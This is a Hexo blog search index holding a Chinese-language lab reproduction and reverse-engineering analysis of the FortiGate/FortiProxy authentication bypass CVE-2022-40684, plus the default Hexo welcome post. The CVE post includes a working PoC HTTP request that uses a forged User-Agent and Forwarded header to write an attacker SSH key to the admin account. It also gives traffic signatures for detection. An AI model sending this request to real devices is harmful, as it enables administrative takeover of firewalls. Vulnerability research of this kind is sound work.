<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2022-40684</title>
    <link href="/2024/01/25/CVE-2022-40684/"/>
    <url>/2024/01/25/CVE-2022-40684/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-40684"><a href="#CVE-2022-40684" class="headerlink" title="CVE-2022-40684"></a>CVE-2022-40684</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Fortinet修复了一个存在 FortiGate 防火墙和 FortiProxy Web 代理中的身份验证绕过漏洞（CVE-2022-40684），该漏洞可能允许攻击者在易受攻击的设备上执行未经授权的操作，攻击者通过向易受攻击的目标发送特制的 HTTP 或 HTTPS 请求进行绕过身份认证以管理员身份在控制面板中执行任意操作。</p><h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= FortiOS &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><br><span class="hljs-attribute">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> &lt;= FortiOS &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= FortiProxy &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><br><span class="hljs-attribute">FortiProxy</span> = <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">FortiSwitchManager</span> = <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">FortiSwitchManager</span> = <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="三、复现环境"><a href="#三、复现环境" class="headerlink" title="三、复现环境"></a>三、复现环境</h2><ul><li>FortiGate-VM 7.2.1</li></ul><h2 id="四、环境搭建"><a href="#四、环境搭建" class="headerlink" title="四、环境搭建"></a>四、环境搭建</h2><h3 id="4-1-导入虚拟机"><a href="#4-1-导入虚拟机" class="headerlink" title="4.1.导入虚拟机"></a>4.1.导入虚拟机</h3><ul><li>使用vmware打开下载的FortiGate-vm虚拟镜像</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123211511921.png" class="" title="png"><ul><li>接受许可协议</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123211600250.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240123211649260.png" class="" title="png"><h3 id="4-2-更改虚拟机配置"><a href="#4-2-更改虚拟机配置" class="headerlink" title="4.2.更改虚拟机配置"></a>4.2.更改虚拟机配置</h3><ul><li>给forigate配置ip和网关，打开虚拟机设置</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123211928513.png" class="" title="png"><ul><li>点击编辑，选择虚拟网络编辑器，查看VMnet8的子网IP和网关，这里注意一会在虚拟机里面配置的网关要与之相同。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123212154008.png" class="" title="png"><h3 id="4-3-配置FortiGate"><a href="#4-3-配置FortiGate" class="headerlink" title="4.3.配置FortiGate"></a>4.3.配置FortiGate</h3><ul><li>打开虚拟机，初始账号admin 提示输入密码直接回车，提示输入新密码</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123212601844.png" class="" title="png"><ul><li>使用如下命令查看接口信息</li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> system <span class="hljs-class"><span class="hljs-keyword">interface</span></span><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123212656644.png" class="" title="png"><ul><li>配置ip地址</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config<span class="hljs-built_in"> system interface</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">edit</span> port1<br><span class="hljs-built_in">set</span> mode static<br><span class="hljs-built_in">set</span><span class="hljs-built_in"> ip </span>192.168.253.55 255.255.255.0<br><span class="hljs-built_in">set</span> allowaccess http<span class="hljs-built_in"> ping </span>ssh<br>end<br><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123212948007.png" class="" title="png"><ul><li>配置网关</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config router static<br><span class="hljs-built_in">edit</span> 1<br><span class="hljs-built_in">set</span> device port1<br><span class="hljs-built_in">set</span> gateway 192.168.253.2<br>end<br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123213208336.png" class="" title="png"><ul><li>尝试ping一下</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123213245810.png" class="" title="png"><h3 id="4-4-登录获取许可证"><a href="#4-4-登录获取许可证" class="headerlink" title="4.4.登录获取许可证"></a>4.4.登录获取许可证</h3><ul><li>打开浏览器输入<code>192.168.253.55</code> 进入登录界面，输入之前设置的账户密码登录</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123213611746.png" class="" title="png"><ul><li>登录后输入账户密码获取许可证</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123210443692.png" class="" title="png">* 等待重启<img src="/2024/01/25/CVE-2022-40684/20240123210530282.png" class="" title="png"><ul><li>点击Later</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123210708933.png" class="" title="png">* 发现正常登录成功<img src="/2024/01/25/CVE-2022-40684/20240123210746990.png" class="" title="png"><h2 id="五、漏洞验证"><a href="#五、漏洞验证" class="headerlink" title="五、漏洞验证"></a>五、漏洞验证</h2><h3 id="5-1-xshell生成密钥"><a href="#5-1-xshell生成密钥" class="headerlink" title="5.1.xshell生成密钥"></a>5.1.xshell生成密钥</h3><img src="/2024/01/25/CVE-2022-40684/20240123225820581.png" class="" title="png"><ul><li>生成公钥</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123225907942.png" class="" title="png"><h3 id="5-2-poc包"><a href="#5-2-poc包" class="headerlink" title="5.2.poc包"></a>5.2.poc包</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PUT /api/v2/cmdb/<span class="hljs-keyword">system</span>/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.253</span><span class="hljs-number">.55</span><br><span class="hljs-keyword">User</span>-Agent: Report Runner<br>Accept-<span class="hljs-keyword">Encoding</span>: gzip, deflate<br><span class="hljs-keyword">Connection</span>: <span class="hljs-keyword">close</span><br>Forwarded:<span class="hljs-keyword">for</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>; <span class="hljs-keyword">by</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;<br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br>Content-Length: <span class="hljs-number">411</span><br><br>&#123;&quot;ssh-public-key1&quot;: &quot;\&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAnVQJuIzvGfdyzx3Q==\&quot;&quot;&#125; //这里为刚才生成的公钥<br><br><br><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123230109427.png" class="" title="png"><h3 id="5-3-使用xshell进行连接"><a href="#5-3-使用xshell进行连接" class="headerlink" title="5.3.使用xshell进行连接"></a>5.3.使用xshell进行连接</h3><img src="/2024/01/25/CVE-2022-40684/20240123225553692.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240123225646054.png" class="" title="png"><h2 id="六、漏洞分析"><a href="#六、漏洞分析" class="headerlink" title="六、漏洞分析"></a>六、漏洞分析</h2><ul><li>将forigate-vm中的fortios.vmdk复制出来进行分析</li></ul><h3 id="6-1-文件提取"><a href="#6-1-文件提取" class="headerlink" title="6.1.文件提取"></a>6.1.文件提取</h3><ul><li>1.安装libguestfs</li><li>libguestfs 是一组 Linux 下的 C 语言的 API ，用来访问虚拟机的磁盘映像文件。</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> libguestfs-tools<br></code></pre></td></tr></table></figure><ul><li><p>2.查看磁盘分区情况</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sudo virt-<span class="hljs-keyword">file</span><span class="hljs-params">system</span>s -a fortios.vmdk<br></code></pre></td></tr></table></figure></li><li><p>3.挂载</p></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sudo guestmount -<span class="hljs-selector-tag">a</span> fortios<span class="hljs-selector-class">.vmdk</span> -m /dev/sda1 <span class="hljs-attr">--ro</span> <span class="hljs-built_in">fortios_dir</span>(替换成自己的目标文件夹)<br></code></pre></td></tr></table></figure><ul><li>4.挂载成功后，rootfs.gz为文件系统压缩包</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123233953686.png" class="" title="png"><ul><li>5.解压需要进一步解压rootfs.gz</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> rootfs.gz rootfd<br><span class="hljs-built_in">cd</span> rootfd<br>gunzip rootfs.gz <br>cpio -i 2&gt; /dev/null &lt; rootfs<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123234834988.png" class="" title="png"><ul><li><ol start="6"><li><code>bin.tar.xz</code> 文件夹，使用 sbin 目录自带的命令解压</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">chroot . /sbin/xz <span class="hljs-attr">--decompress</span> bin<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.xz</span><br>tar -xvf bin<span class="hljs-selector-class">.tar</span><br><br></code></pre></td></tr></table></figure></li></ul><img src="/2024/01/25/CVE-2022-40684/20240124003234046.png" class="" title="png"><h3 id="6-2-测试漏洞"><a href="#6-2-测试漏洞" class="headerlink" title="6.2.测试漏洞"></a>6.2.测试漏洞</h3><ul><li>进入到bin目录后寻找httpsd程序。httpsd是init程序的软连接，并且这里可以看出init程序非常大，逆向该程序比较费时。所以我们可以根据调试信息先来逆向程序逻辑。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124003448585.png" class="" title="png"><ul><li>运行以下命令开启httpsd程序的调试信息</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">diagnose <span class="hljs-built_in">debug</span> <span class="hljs-built_in">enable</span><br>diagnose <span class="hljs-built_in">debug</span> application httpsd -1<br>diagnose <span class="hljs-built_in">debug</span> cli 8<br></code></pre></td></tr></table></figure><ul><li>使用poc进行测试，操作的信息会输出到屏幕上：</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124220557790.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240124220657938.png" class="" title="png"><h3 id="6-3-原理分析"><a href="#6-3-原理分析" class="headerlink" title="6.3.原理分析"></a>6.3.原理分析</h3><ul><li>在IDA pro中打开init程序，搜索字符串fweb_authorize_all进行定位</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124225829156.png" class="" title="png"><ul><li>如上图所示并未找到，我在其他师傅那里看到可以直接识别fweb_authorize_all函数是在ap_hook_check_access_ex中调用的但我的ida并未识别，我是通过搜索上下文字符串反向定位fweb_authorize_all函数，然后搜索ap_hook_check_access_ex发现是一个访问控制函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124230405522.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240124230555262.png" class="" title="png"><ul><li>进入到函数fweb_authorize_all（sub_C4AFB0）中，分析可得，在身份认证过程中，首先判断v2[8]是否等于”127.0.0.1”，即判断是否本机访问。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124231333037.png" class="" title="png"><ul><li>如果本机访问则sub_C50E80函数内部继续判断接口如果是否为vsys_fgfm接口。<img src="/2024/01/25/CVE-2022-40684/20240124231402283.png" class="" title="png">* 随后取Forwarded头的value值，strstr函数查找"for="的位置，随后执行if结构体内容，再次判断Forwarded_header_content_tmp中是否存在"by"字符，如果判断不通过并不会进入到api_check_access函数中。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124231735976.png" class="" title="png"><ul><li>从该函数中退出来，继续往上跟踪，发现在地址C4AC70处，先调用了sub_C4B590函数，然后ap_hook_handler hook了sub_C4AC60函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233135960.png" class="" title="png"><ul><li>进入到sub_C4AC60函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233205738.png" class="" title="png"><ul><li>接着往下进入函数sub_C4C480，在进入sub_C4BF20函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233441011.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240124233519261.png" class="" title="png"><ul><li>sub_C4BF20函数返回了sub_C4BB20函数，进入该函数，发现了调试信息出现的字符fweb_debug_init</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233624746.png" class="" title="png"><ul><li>重新回到sub_C4C480，分析函数v3[1]函数和sub_C4C2A0，跟进分析一下v3[1]函数，往上看,v3&#x3D;a2,而a2是函数sub_C4C480的参数</li><li></li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233841531.png" class="" title="png"><ul><li>通过交叉引用，发现a2参数为off_3FEA400函数数组的地址<img src="/2024/01/25/CVE-2022-40684/20240124234001439.png" class="" title="png">* 查看此数组</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124234025993.png" class="" title="png"><ul><li>发现从此处会调用一系列hanler函数，这里v3应该对应sub_c929F0函数。查看sub_c929F0函数，函数中调用了api_check_access函数，并且程序会根据api_check_access返回值返回用户对应响应码的reponse。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124234442983.png" class="" title="png"><ul><li>进入api_check_access函数中进行查看，该函数中无任何输出。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124234557225.png" class="" title="png"><ul><li>在IDA中搜索api_access_check_for_trusted_access字符，发现api_access_check_for_trusted_access函数中调用sub_C510D0，传入参数为”Node.js”</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124235055698.png" class="" title="png"><ul><li>sub_C510D0函数中判断表单中User-Agent的value值是否与Node.js是否相同，如果不是”Node.js”，则判断User-Agent的value值是否与Report Runner是否相同</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124235808732.png" class="" title="png"><ul><li>进入到以上俩种方式中的某一种，用户赋值为”Local_Process_Access”，此时会绕过身份认证。分析到这里，我们就可以知道要想攻击成功，需要设置Forwarded头value值必须为”for&#x3D;”，后面可以设置127.0.0.1来隐藏防火墙中的攻击记录，而User-Agent的value可以设置”Node.js”和”Report Runner”俩种中的一个。</li></ul><h2 id="七、流量分析"><a href="#七、流量分析" class="headerlink" title="七、流量分析"></a>七、流量分析</h2><ul><li>结合以上分析可得,请求头特征</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PUT /api/v2/cmdb/<span class="hljs-keyword">system</span>/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span> HTTP/<span class="hljs-number">1.1</span><br><span class="hljs-keyword">User</span>-Agent: Report Runner<br><span class="hljs-keyword">User</span>-Agent: Node.js<br>Forwarded:<span class="hljs-keyword">for</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>; <span class="hljs-keyword">by</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;<br>&#123;&quot;ssh-public-key1&quot;: &quot;\&quot;ssh-rsa AAAAB3NzaC1yc2EQ==\&quot;&quot;&#125;<br><br></code></pre></td></tr></table></figure><ul><li>根据数据包得响应体特征</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;cli_error&quot;</span>:<span class="hljs-string">&quot;SSH key is good.</span><br></code></pre></td></tr></table></figure><h2 id="八、-参考链接"><a href="#八、-参考链接" class="headerlink" title="八、 参考链接"></a>八、 参考链接</h2><ul><li><a href="https://blog.csdn.net/We8__/article/details/128306432">https://blog.csdn.net/We8__/article/details/128306432</a></li><li><a href="https://bbs.kanxue.com/thread-275335.htm">https://bbs.kanxue.com/thread-275335.htm</a></li><li><a href="https://zhuanlan.zhihu.com/p/575575181">https://zhuanlan.zhihu.com/p/575575181</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>network_device</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability_analysis</tag>
      
      <tag>FortiGate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/12/26/hello-world/"/>
    <url>/2023/12/26/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
